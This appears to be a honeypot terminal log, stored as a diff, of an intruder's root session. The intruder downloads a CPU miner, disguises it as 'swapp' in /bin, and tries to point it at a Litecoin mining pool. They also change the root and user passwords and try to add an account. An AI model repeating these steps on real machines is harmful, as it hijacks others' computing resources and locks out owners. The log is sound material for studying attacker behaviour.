@@ -1,0 +1,587 @@
+[4hAWSWeb:~# w
+[4l 16:58:53 up 77 days, 22:20,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    91.209.59.45      16:58    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# lscpu
+bash: lscpu: command not found
+AWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /var
+[4l[4hAWSWeb:/var# cd lib
+[4l[4hAWSWeb:/var/lib# ls
+[4lurandom         initramfs-tools vim             dpkg            apt             
+dhcp3           initscripts     libuuid         misc            x11             
+[4hAWSWeb:/var/lib# cd [1D[1P[1D[1P[1D[1Pmkdir init
+[4l[4hAWSWeb:/var/lib# cd ini[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd init
+[4l[4hAWSWeb:/var/lib/init# df -h
+bash: df: command not found
+AWSWeb:/var/lib/init# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:/var/lib/init#  [1D[1P[Kwget http://sourceforge.net/projects/cpuminer/files/pooler-cpuminer-2.3.2-linux-x86.tar.gz/download[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+[4l--2014-01-09 17:00:01--  http://sourceforge.net/projects/cpuminer/files/pooler-cpuminer-2.3.2-linux-x86.tar.gz
+Connecting to sourceforge.net:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 169783 (165K) [application/x-gzip]
+Saving to: `pooler-cpuminer-2.3.2-linux-x86.tar.gz
+
+ 0% [>                                      ] 1,448        2K/s  eta 1m 6s100%[======================================>] 169,783      2K/s
+
+2014-01-09 17:00:02 (2 KB/s) - `pooler-cpuminer-2.3.2-linux-x86.tar.gz' saved [169783/169783]
+[4hAWSWeb:/var/lib/init# tar zxvf p[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptar zxvf pooler-cpuminer-2.3.2-linux-x86.tar.gz 
+[4lminerd
+[4hAWSWeb:/var/lib/init# rm[1D[1P[1D[1Pmv [1D[1P[1D[1P[1D[1P
+pooler-cpuminer-2.3.2-linux-x86.tar.gz minerd                                 
+AWSWeb:/var/lib/init# mv m[1D[1P[1D[1P[1D[1P[1D[1Pmv minerd init
+[4l[4hAWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz init                                   
+[4hAWSWeb:/var/lib/init# vi /et[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /etc/[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+services               magic.mime             network                
+python2.5              adjtime                mailcap                
+shadow-                modules                debian_version         
+ld.so.conf.d           passwd                 localtime              
+hosts                  rc4.d                  rcS.d                  
+logrotate.d            securetty              mtab                   
+mime.types             sysctl.d               .pwd.lock              
+environment            inputrc                initramfs-tools        
+modprobe.d             debconf.conf           security               
+vim                    ssh                    resolv.conf            
+skel                   gshadow-               dpkg                   
+udev                   scsi_id.config         rc6.d                  
+ld.so.cache            rc5.d                  apt                    
+networks               opt                    group                  
+inittab                issue                  default                
+issue.net              mailcap.order          dhcp3                  
+pam.conf               hosts.deny             rc.local               
+python                 nsswitch.conf          rsyslog.conf           
+wgetrc                 motd.tail              mke2fs.conf            
+rc1.d                  sysctl.conf            rmt                    
+ld.so.conf             group-                 rc3.d                  
+adduser.conf           init.d                 hosts.allow            
+gshadow                cron.daily             alternatives           
+hostname               bash.bashrc            rc0.d                  
+pam.d                  gai.conf               timezone               
+deluser.conf           lsb-base               passwd-                
+rpc                    magic                  kernel-img.conf        
+motd                   shadow                 protocols              
+bash_completion.d      host.conf              rc2.d                  
+profile                X11                    bindresvport.blacklist 
+rsyslog.d              fstab                  login.defs             
+shells                 terminfo               
+AWSWeb:/var/lib/init# vi /etc/[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+services               magic.mime             network                
+python2.5              adjtime                mailcap                
+shadow-                modules                debian_version         
+ld.so.conf.d           passwd                 localtime              
+hosts                  rc4.d                  rcS.d                  
+logrotate.d            securetty              mtab                   
+mime.types             sysctl.d               .pwd.lock              
+environment            inputrc                initramfs-tools        
+modprobe.d             debconf.conf           security               
+vim                    ssh                    resolv.conf            
+skel                   gshadow-               dpkg                   
+udev                   scsi_id.config         rc6.d                  
+ld.so.cache            rc5.d                  apt                    
+networks               opt                    group                  
+inittab                issue                  default                
+issue.net              mailcap.order          dhcp3                  
+pam.conf               hosts.deny             rc.local               
+python                 nsswitch.conf          rsyslog.conf           
+wgetrc                 motd.tail              mke2fs.conf            
+rc1.d                  sysctl.conf            rmt                    
+ld.so.conf             group-                 rc3.d                  
+adduser.conf           init.d                 hosts.allow            
+gshadow                cron.daily             alternatives           
+hostname               bash.bashrc            rc0.d                  
+pam.d                  gai.conf               timezone               
+deluser.conf           lsb-base               passwd-                
+rpc                    magic                  kernel-img.conf        
+motd                   shadow                 protocols              
+bash_completion.d      host.conf              rc2.d                  
+profile                X11                    bindresvport.blacklist 
+rsyslog.d              fstab                  login.defs             
+shells                 terminfo               
+AWSWeb:/var/lib/init# vi /etc/rc.[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /etc/rc.local [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+pooler-cpuminer-2.3.2-linux-x86.tar.gz init                                   
+AWSWeb:/var/lib/init# vi /etc/rc.local 
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/var/lib/init# vim [4D[Kvi /etc/rc.local [17D[1C[1Cm
+bash: vim: command not found
+AWSWeb:/var/lib/init# [Kvim /etc/rc.local [18D[1P[1P[1Pedit
+bash: edit: command not found
+AWSWeb:/var/lib/init# mc
+bash: mc: command not found
+AWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz init                                   
+[4hAWSWeb:/var/lib/init# init[4D./[4C -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.54[1D[1P[1D[1P6540:pass -R 2 [1D[1P
+bash: ./init: command not found
+AWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz init                                   
+[4hAWSWeb:/var/lib/init# mv ini[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pmv init swapp
+[4l[4hAWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz swapp                                  
+[4hAWSWeb:/var/lib/init# chmod +x sa[1D[1Pw[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod +x swapp 
+[4l[4hAWSWeb:/var/lib/init# [Kchmod +x swapp [15D[Kls[2D[Kmv init swapp[13D[Kls[2D[K./init -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2[77D[1C[1C[1C[1C[1C[1D[1D[1D[1D[1D[1C[1P
+bash: .init: command not found
+AWSWeb:/var/lib/init# [K.init -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[18D[K[K[K[K[K[K[K.
+bash: .: command not found
+AWSWeb:/var/lib/init# ./swa[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./swapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2
+bash: ./swapp: command not found
+AWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz swapp                                  
+[4hAWSWeb:/var/lib/init# ls -l
+[4ldrwxr-xr-x 1 root root   4096 2014-01-09 17:02 .
+drwxr-xr-x 1 root root   4096 2014-01-09 17:02 ..
+-rw-r--r-- 1 root root 169783 2014-01-09 17:00 pooler-cpuminer-2.3.2-linux-x86.tar.gz
+-rwxr-xr-x 1 root root 379680 2013-07-10 13:57 swapp
+[4hAWSWeb:/var/lib/init# [Kls -l[5D[Kls[2D[K./swapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[26D[K.[1D[K./swapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2[1D[77D[Kls[2D[Kls -l[5D[K[K[K[Kls -l
+[4ldrwxr-xr-x 1 root root   4096 2014-01-09 17:02 .
+drwxr-xr-x 1 root root   4096 2014-01-09 17:02 ..
+-rw-r--r-- 1 root root 169783 2014-01-09 17:00 pooler-cpuminer-2.3.2-linux-x86.tar.gz
+-rwxr-xr-x 1 root root 379680 2013-07-10 13:57 swapp
+[4hAWSWeb:/var/lib/init# [Kls -l[5D[Kls -l[5D[Kls[2D[K./swapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2[1D[77D[1C[1C[1D[1P[1D[1P
+bash: swapp: command not found
+AWSWeb:/var/lib/init# ./swapp
+bash: ./swapp: command not found
+AWSWeb:/var/lib/init# mv sw[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pmv swapp /bin
+[4l[4hAWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz 
+[4hAWSWeb:/var/lib/init# cd /b[5D[Kls[2D[Kmv swapp /bin[13D[K./swapp[7D[Kswapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2
+bash: swapp: command not found
+AWSWeb:/var/lib/init# swa[1D[1P[1D[1P[1D[1Pl[1D[1Psu -
+[4l[4hAWSWeb:/var/lib/init# [Ksu -[4D[Kswapp -o stratum+tcp://usa.wemineltc.com:80 --userpass nikomo.6540:pass -R 2
+bash: swapp: command not found
+AWSWeb:/var/lib/init# vi /et[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /etc/[1D[1P[1D[1P[1D[1P[1D[1Proo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /root/[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+.debtags  .viminfo  .aptitude .profile  .bashrc   
+AWSWeb:/var/lib/init# vi /root/[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+.debtags  .viminfo  .aptitude .profile  .bashrc   
+AWSWeb:/var/lib/init# vi /root/.pro[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /root/.profile 
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/var/lib/init# w
+[4l 17:03:56 up 77 days, 22:25,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    91.209.59.45      16:58    0.09   0.05   0.05 w
+[4hAWSWeb:/var/lib/init# last
+[4lroot	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:11 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:11 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:11 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:11 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:11 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:11 - 18:12 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:12 - 18:12 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:12 - 18:12 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:12 - 18:12 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:12 - 18:12 (00:03)
+root	pts/0	202.119.236.121	Wed Jan 08 18:12 - 18:12 (00:03)
+root	pts/0	111.39.43.47	Wed Jan 08 18:44 - 18:45 (01:14)
+root	pts/0	122.155.17.214	Wed Jan 08 20:51 - 20:51 (00:11)
+root	pts/0	46.105.109.70	Wed Jan 08 23:45 - 23:46 (00:02)
+root	pts/0	46.105.109.70	Wed Jan 08 23:46 - 23:46 (00:02)
+root	pts/0	111.39.43.47	Thu Jan 09 01:16 - 01:18 (01:57)
+root	pts/0	110.164.71.149	Thu Jan 09 10:35 - 10:36 (00:29)
+root	pts/0	219.76.239.210	Thu Jan 09 10:38 - 10:39 (00:13)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:03)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:04)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:03)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:07)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:05)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:04)
+root	pts/0	202.142.217.136	Thu Jan 09 14:10 - 14:10 (00:10)
+
+[4hAWSWeb:/var/lib/init# w
+[4l 17:04:01 up 77 days, 22:25,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    91.209.59.45      16:58    0.09   0.05   0.05 w
+[4hAWSWeb:/var/lib/init# ls
+[4lpooler-cpuminer-2.3.2-linux-x86.tar.gz 
+[4hAWSWeb:/var/lib/init# w
+[4l 17:04:14 up 77 days, 22:25,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    91.209.59.45      16:58    0.09   0.05   0.05 w
+[4hAWSWeb:/var/lib/init# lspci
+bash: lspci: command not found
+AWSWeb:/var/lib/init# cat /ro[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /root/.pro[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /root/.profile 
+[4lcat: /root/.profile: No such file or directory
+[4hAWSWeb:/var/lib/init# cat
+[4l[4hAWSWeb:/var/lib/init# cd /root
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# ls -lha
+[4ldrwxr-xr-x 1 root root 4096 2014-01-09 17:04 .
+drwxr-xr-x 1 root root 4096 2014-01-09 17:04 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# cat .pro[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat .profile 
+[4lcat: /root/.profile: No such file or directory
+[4hAWSWeb:~# useradd
+[4ladduser: Only one or two names allowed.
+[4hAWSWeb:~# [Kuseradd newbie
+[4lAdding user `newbie' ...
+Adding new group `newbie' (1001) ...
+Adding new user `newbie' (1001) with group `newbie' ...
+Creating home directory `/home/newbie' ...
+Copying files from `/etc/skel' ...
+Password: 
+Password again: 
+
+Changing the user information for newbie
+Enter the new value, or press ENTER for the default
+        Username []: 
+Must enter a value!
+        Username []: newbie
+        Full Name []: newbie
+        Room Number []: 1
+        Work Phone []: 1
+        Home Phone []: 1
+        Mobile Phone []: 1
+        Country []: GE
+        City []: BR
+        Language []: DE
+        Favorite movie []: 1
+        Other []: 1
+Is the information correct? [Y/n] y
+ERROR: Some of the information you entered is invalid
+Deleting user `newbie' ...
+Deleting group `newbie' (1001) ...
+Deleting home directory `/home/newbie' ...
+Try again? [Y/n] n[1D[1Py[1D[1Pn
+[4hAWSWeb:~# users
+bash: users: command not found
+AWSWeb:~# user
+bash: user: command not found
+AWSWeb:~# cat[1D[1P[1D[1P[1D[1Pcd /etc
+[4l[4hAWSWeb:/etc# cat passwd
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hAWSWeb:/etc# passwd richard
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/etc# su ru[1D[1P[1D[1P[1D[1Pdo richsa[1D[1P[1D[1Pard
+bash: sudo: command not found
+AWSWeb:/etc# su richs[1D[1Pard
+[4l[4hAWSWeb:/etc# swapp
+bash: swapp: command not found
+AWSWeb:/etc# cd /bin
+[4l[4hAWSWeb:/bin# ./swap[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./swapp [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+which         cp            sleep         cat           uname         gzip          pwd           dir           kill          zless         
+tailf         true          sed           zcat          mkdir         lsmod         mknod         znew          grep          mv            
+dmesg         gunzip        df            mountpoint    bash          rbash         fgrep         login         pidof         zdiff         
+chmod         echo          zcmp          netstat       run-parts     touch         readlink      chgrp         ps            chown         
+rmdir         egrep         vdir          sh            mount         zegrep        more          zgrep         false         zmore         
+gzexe         mt            tempfile      ls            hostname      zfgrep        su            ln            cpio          rm            
+zforce        ping          umount        dd            mt-gnu        tar           dnsdomainname uncompress    date          ping6         
+stty          sync          mktemp        swapp         
+AWSWeb:/bin# ./swapp [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+which         cp            sleep         cat           uname         gzip          pwd           dir           kill          zless         
+tailf         true          sed           zcat          mkdir         lsmod         mknod         znew          grep          mv            
+dmesg         gunzip        df            mountpoint    bash          rbash         fgrep         login         pidof         zdiff         
+chmod         echo          zcmp          netstat       run-parts     touch         readlink      chgrp         ps            chown         
+rmdir         egrep         vdir          sh            mount         zegrep        more          zgrep         false         zmore         
+gzexe         mt            tempfile      ls            hostname      zfgrep        su            ln            cpio          rm            
+zforce        ping          umount        dd            mt-gnu        tar           dnsdomainname uncompress    date          ping6         
+stty          sync          mktemp        swapp         
+AWSWeb:/bin# ./swapp 
+bash: ./swapp: command not found
+AWSWeb:/bin# cat
+[4l[4hAWSWeb:/bin# whoami
+[4lroot
+[4hAWSWeb:/bin# vi
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/bin# [Kvi[2D[Kwhoami[6D[Kcat[3D[K./swapp [8D[Kcd /bin[7D[Kswapp[5D[Ksu richard[10D[Ksudo richard[12D[Kpasswd richard[14D[Kcat passwd[10D[Kcd /etc[7D[Kuser[4D[Kusers[5D[Kuseradd newbie[14D[Kuseradd[7D[Kcat .profile [13D[Kls -lha[7D[Kcat .profile 
+[4lcat: .profile: No such file or directory
+[4hAWSWeb:/bin# [Kcat .profile [13D[Kvi[2D[Kwhoami[6D[Kcat[3D[K./swapp [8D[Kcd /bin[7D[Kswapp[5D[Ksu richard[10D[Ksudo richard[12D[Kpasswd richard[14D[Kcat passwd[10D[Kcd /etc[7D[Kuser[4D[Kcd /etc
+[4l[4hAWSWeb:/etc# catt pas[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcatt passwd
+bash: catt: command not found
+AWSWeb:/etc# [Kcatt passwd[11D[1C[1C[1P
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hAWSWeb:/etc# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/etc# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# w
+[4l 17:08:47 up 77 days, 22:30,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    91.209.59.45      16:58    0.09   0.05   0.05 w
+[4hlocalhost:~# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:~# cat[1D[1P[1D[1P[1D[1Ps[1D[1P[Kuname -a[8D[Kw[1D[Kexit[4D[Kpasswd[6D[Kcat passwd[10D[Kcatt passwd[11D[Kcd /etc[7D[Kcat .profile [13D[Kvi[2D[Kcat .profile 
+[4lcat: /root/.profile: No such file or directory
+[4hlocalhost:~# ls
+[4l[4hlocalhost:~# ls a
+[4lls: cannot access /root/a: No such file or directory
+[4hlocalhost:~# [Kls a[1D[1P-a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hlocalhost:~# mc
+bash: mc: command not found
+localhost:~# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get n[1D[1Pinstall mc
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  mc 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 122.2kB of archives.
+After this operation, 268.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main mc 0.26-10 [122.2kB]
+Fetched 122.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking mc (from .../archives/mc_0.26-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up mc (0.26-10) ...
+[4hlocalhost:~# mc
+[4lmc: Segmentation fault
+[4hlocalhost:~# at[1D[1Ppt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# 
+localhost:~# [Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# exit[1D[1P[1D[1P[1D[1P[1D[1Pexit[1D[1P[1D[1P[1D[1P[1D[1Pls
+[4l[4hlocalhost:~# ex[1D[1P[1D[1Paot[1D[1P[1D[1Ppt-get [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pdf
+bash: df: command not found
+localhost:~# df -h
+bash: df: command not found
+localhost:~# free
+bash: free: command not found
+localhost:~# top
+bash: top: command not found
+localhost:~# apt-get install top
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  top 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 548.2kB of archives.
+After this operation, 1205.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main top 0.24-8 [548.2kB]
+Fetched 548.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking top (from .../archives/top_0.24-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up top (0.24-8) ...
+[4hlocalhost:~# apt-get install kernel
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  kernel 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 515.2kB of archives.
+After this operation, 1133.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main kernel 0.1-2 [515.2kB]
+Fetched 515.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking kernel (from .../archives/kernel_0.1-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up kernel (0.1-2) ...
+[4hlocalhost:~# top
+[4ltop: Segmentation fault
+[4hlocalhost:~# apt-get install gcc
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  gcc 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 332.2kB of archives.
+After this operation, 730.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main gcc 1.34-2 [332.2kB]
+Fetched 332.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking gcc (from .../archives/gcc_1.34-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up gcc (1.34-2) ...
+[4hlocalhost:~# apt-get install [[1D[1P[1D[1P[1D[1D[1D[1D[1D[1D[1Dgroup[7C MA[1D[1Paiun[1D[1P[1D[1Pn
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get groupinstall Main[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get groupinstal[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pt --[1D[1P[1D[1P/?
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# [Kapt-get /?[1D[1P[1D[1P[1D[1P --help
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:~# apt-get install Main
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  Main 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 817.2kB of archives.
+After this operation, 1797.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main Main 1.35-10 [817.2kB]
+Fetched 817.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking Main (from .../archives/Main_1.35-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up Main (1.35-10) ...
+[4hlocalhost:~# ls
+[4l[4hlocalhost:~# df
+bash: df: command not found
+localhost:~# apt-get install df
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  df 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
